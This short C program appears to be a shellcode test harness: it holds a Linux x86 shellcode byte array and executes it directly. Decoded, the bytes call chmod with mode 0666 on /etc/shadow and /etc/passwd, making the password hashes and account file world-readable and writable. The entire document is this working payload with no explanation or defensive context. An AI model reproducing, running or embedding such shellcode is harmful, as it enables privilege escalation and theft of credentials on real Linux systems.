#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xbe\x2f\x65\x74\x63\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x56\x89\xe3\x04\x0f\x66\xb9\xb6\x01\xcd\x80\x89\xd0\x50\x68\x73\x73\x77\x64\x04\x0f\x68\x2f\x2f\x70\x61\x56\x54\x5b\xcd\x80\x89\xd0\x40\xcd\x80";

main() {
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
